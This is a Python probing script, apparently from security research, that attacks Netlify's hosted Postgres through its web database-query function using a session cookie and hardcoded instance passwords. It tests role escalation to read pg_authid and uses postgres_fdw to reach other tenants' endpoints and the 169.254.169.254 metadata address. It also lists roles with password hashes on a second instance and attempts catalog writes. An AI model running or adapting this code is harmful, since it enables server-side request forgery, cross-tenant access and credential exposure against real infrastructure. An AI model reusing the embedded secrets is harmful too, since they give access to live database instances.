# -*- coding: utf-8 -*-
"""第三轮:
T1 action=transaction(queries 数组)语义探测 -> 顺带验证多语句单连接能力
T2 SET ROLE 根因定位:哪个成员关系让 netlifydb_owner 能读 pg_authid
T3 修正 FDW 矩阵(dbname=netlifydb):A/B/裸proxy 带各自凭据 + 公网对照
T4 B 实例系统性验证(外部 psycopg 读 pg_authid)
T5 pg_database 等目录 no-op 写测试
T6 rag beta 确认参数尝试
"""
import http.client, ssl, gzip, brotli, json, sys, itertools
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
EP_A = 'ep-autumn-cherry-ay51mbqz.c-5.us-east-2.db.netlify.com'
PW_A = 'npg_MtTpnyk2LE4j'
EP_B = 'ep-lucky-sound-aeh4epbm.c-2.us-east-2.db.netlify.com'
PW_B = 'npg_TWUSd2Mavu7G'


def _req(body, timeout=40):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    try:
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st, out = r.status, raw[:5000].decode('utf-8', 'ignore')
    except Exception as e:
        st, out = -1, 'HTTP-EXC %r' % e
    finally:
        conn.close()
    return st, out


def q(sql, timeout=40, trunc=2000):
    st, out = _req({'siteId': SITE_A, 'action': 'query', 'sql': sql}, timeout=timeout)
    return st, out[:trunc]


def txn(queries, timeout=45, trunc=2500):
    """action=transaction 多语句(单连接)"""
    st, out = _req({'siteId': SITE_A, 'action': 'transaction', 'queries': queries}, timeout=timeout)
    return st, out[:trunc]


def show(label, sql, trunc=1500, timeout=40):
    st, out = q(sql, timeout, trunc)
    print('%-44s [%d] %s' % (label, st, out.replace('\n', ' ')[:trunc]))
    return st, out


_seq = itertools.count(1)


def fdw_eg(label, host, port=5432, um_user='netlifydb_owner', um_pw=PW_A, db='netlifydb', cto='8', read_timeout=40):
    n = 'e%d' % next(_seq)
    steps = [
        ("create server",
         "create server if not exists srv_%s foreign data wrapper postgres_fdw "
         "options (host '%s', port '%s', dbname '%s', connect_timeout '%s')" % (n, host, port, db, cto)),
        ("um",
         "create user mapping if not exists for netlifydb_owner server srv_%s "
         "options (user '%s', password '%s')" % (n, um_user, um_pw)),
        ("ft",
         "create foreign table if not exists ft_%s(id int) server srv_%s "
         "options (schema_name 'public', table_name 'k_z')" % (n, n)),
        ("read", 'select * from ft_%s' % n),
    ]
    print('--- %s (host=%s:%s user=%s db=%s)' % (label, host, port, um_user, db))
    for desc, sql in steps:
        to = read_timeout if desc == 'read' else 30
        st, out = q(sql, timeout=to, trunc=500)
        print('    %-8s [%d] %s' % (desc, st, out.replace('\n', ' ')[:450]))
    for sql in ("drop foreign table if exists ft_%s" % n,
                "drop user mapping if exists for netlifydb_owner server srv_%s" % n,
                "drop server if exists srv_%s" % n):
        q(sql, timeout=15)


print('========== T1. transaction action 语义 ==========')
for qs in (['select 1'],
           ['select current_user', 'select current_database()'],
           ['create table if not exists k_txn(id int)', "insert into k_txn values (7)", 'select * from k_txn'],
           ['select * from k_txn']):
    st, out = txn(qs, timeout=30)
    print('queries=%s' % json.dumps(qs)[:70])
    print('  [%d] %s' % (st, out.replace('\n', ' ')[:500]))
q("drop table if exists k_txn", timeout=20)

print()
print('========== T2. SET ROLE 根因定位(经 transaction 单连接) ==========')
for role in ('pg_read_all_data', 'pg_write_all_data', 'pg_monitor', 'pg_read_all_stats', 'neon_superuser',
             'pg_maintain', 'pg_stat_scan_tables'):
    st, out = txn(['set role %s' % role, 'select count(*) from pg_authid', 'reset role'], timeout=30)
    ok = 'OK' if out and ('"count"' in out or '1' in out[:120]) else ''
    print('%-22s [%d] %s' % (role, st, out.replace('\n', ' ')[:300]))
show('pg_authid relacl', "select relname, relacl from pg_class where relname in ('pg_authid','pg_database')", 900)
show('pg_init_privs 相关', "select classid::regclass::text, objoid::regclass::text, privtype, array_to_string(initprivs, ',') "
     "from pg_init_privs where classid = 'pg_class'::regclass and objoid in ('pg_authid'::regclass, 'pg_database'::regclass)", 900)

print()
print('========== T3. FDW 修正矩阵(dbname=netlifydb) ==========')
q('create table if not exists k_z(id int)', timeout=25)
q("insert into k_z values (42)", timeout=25)
fdw_eg('A + Acreds(本 endpoint, 期望读到 42)', EP_A)
fdw_eg('B + Bcreds', EP_B, um_pw=PW_B)
fdw_eg('B + Acreds(auth 对照)', EP_B)
fdw_eg('裸 proxy + Acreds', 'db.netlify.com')
fdw_eg('公网 example.com:80', 'example.com', 80)
fdw_eg('元数据 169.254.169.254:80', '169.254.169.254', 80, read_timeout=25)
fdw_eg('本机链路 169.254.254.254:5432', '169.254.254.254')
q("drop table if exists k_z", timeout=20)

print()
print('========== T4. B 实例系统性验证(外部直连) ==========')
import psycopg
for host, pw, tag in ((EP_B, PW_B, 'B'),):
    try:
        with psycopg.connect(host=host, port=5432, dbname='netlifydb', user='netlifydb_owner',
                             password=pw, sslmode='require', connect_timeout=15) as c:
            with c.cursor() as cur:
                cur.execute('select count(*) from pg_authid')
                r1 = cur.fetchone()
                cur.execute("select rolname from pg_authid where rolpassword is not null")
                r2 = cur.fetchall()
        print('%s: pg_authid count=%s, 有密码角色=%s' % (tag, r1, [x[0] for x in r2]))
    except Exception as e:
        print('%s: FAIL %s' % (tag, str(e)[:200]))

print()
print('========== T5. 目录 no-op 写测试 ==========')
show('pg_database no-op update', 'update pg_database set datconnlimit = datconnlimit', 500)
show('pg_auth_members no-op', 'update pg_auth_members set admin_option = admin_option where false', 500)

print()
print('========== T6. rag beta 确认参数 ==========')
for extra in ({'beta': True}, {'allowBeta': True}, {'confirm': True}, {'acknowledge': True}):
    body = {'siteId': SITE_A, 'action': 'query', 'sql': 'create extension rag_bge_small_en_v15'}
    body.update(extra)
    st, out = _req(body, timeout=25)
    print('%s [%d] %s' % (json.dumps(extra), st, out.replace('\n', ' ')[:250]))
    if 'CREATE EXTENSION' in out:
        st2, out2 = q("select n.nspname||'.'||p.proname, p.prosecdef from pg_proc p join pg_namespace n "
                      "on p.pronamespace=n.oid join pg_depend d on d.objid=p.oid and d.classid='pg_proc'::regclass "
                      "join pg_extension e on d.refobjid=e.oid where e.extname like 'rag%' order by 1", timeout=25, trunc=1200)
        print('  objects: %s' % out2.replace('\n', ' ')[:1200])
        q("drop extension if exists rag_bge_small_en_v15 cascade", timeout=25)
        break

print()
print('========== 清理检查 ==========')
st, out = q("select extname from pg_extension order by 1", trunc=400)
print('扩展: %s' % out)
st, out = q("select c.relname from pg_class c join pg_namespace n on c.relnamespace=n.oid "
            "where n.nspname='public' and c.relname like 'k\\_%' or c.relname like 'ft\\_%' or c.relname like 'srv\\_%'", trunc=300)
print('残留: %s' % out)
